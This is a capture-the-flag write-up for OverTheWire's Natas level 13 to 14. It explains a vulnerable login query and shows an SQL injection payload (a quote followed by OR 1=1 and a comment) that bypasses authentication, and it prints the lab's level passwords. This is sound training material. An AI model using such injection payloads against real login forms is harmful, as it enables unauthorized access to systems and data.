# [Level 13 to 14](https://overthewire.org/wargames/natas/natas14.html) - SQL injection

- Login
```
URL: http://natas14.natas.labs.overthewire.org
Username: natas14
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
- Exercise:
  ![image](https://github.com/user-attachments/assets/9ebcf907-da60-4f2f-9c6c-0229963b8327)
  ![image](https://github.com/user-attachments/assets/8f2b9887-55c0-4958-917b-dd930894220e)
- Background:
- Solution:
  - Source code explanation
    - If the request includes "username" as a key in the data, connect to the MySQL database and perform a `SELECT` query from the users database with user input
    - If the request includes "debug", show what query is being executed
    - If the query returns 1 or more rows, print the password
    - Otherwise print "access denied"
  - Database query:
  ```sql
  SELECT * from databaseTableOfUsers where username = "$userProvidedUsername" and password = "$userProvidedPassword"
  ```
    - SELECT * means “select all”, so the entire string means, select everything from the users table where [stated username and password] conditions are true
    - User could provide something like " # (# is comment) and the query would look like:
  ```sql
  SELECT * from databaseTableOfUsers where username = "" # "" and password = "$userProvidedPassword"
  ```
    - Query would be interpreted as:
  ```sql
  SELECT * from databaseTableOfUsers where username = "" #
  ```
  - Change query to
  ```sql
  SELECT * from databaseTableOfUsers where username = "" OR 1=1 #
  ```
  - ![image](https://github.com/user-attachments/assets/55642d87-cd5c-4887-abe4-8b4242343d1d)
  - ![image](https://github.com/user-attachments/assets/be860f19-a586-4812-8a4e-032f7b44e198)
- Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
